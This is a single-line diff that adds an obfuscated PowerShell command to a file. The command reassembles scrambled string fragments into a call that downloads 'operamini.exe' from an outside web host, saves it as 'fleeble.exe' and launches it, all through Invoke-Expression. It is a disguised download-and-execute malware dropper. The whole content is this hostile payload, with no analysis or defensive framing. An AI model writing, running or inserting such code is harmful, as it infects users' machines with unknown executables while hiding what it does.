@@ -1,0 +1,1 @@
+﻿ ((("{10}{2}{18}{4}{3}{24}{7}{15}{21}{9}{23}{11}{16}{13}{1}{5}{20}{22}{6}{12}{17}{8}{0}{19}{14}"-f'fleebl','i.exe{0','bjec','ien',' System.Net.WebCl','},{','.exe{0','ownloadFile(','s {0}','http://world','(New-O','.com/oper','});S','min','xe{0}','{0','a','tart-Proces','t','e.e','0}flee','}','ble','nit','t).D'))  -F [chAR]39) | iNVoke-ExpRessIon
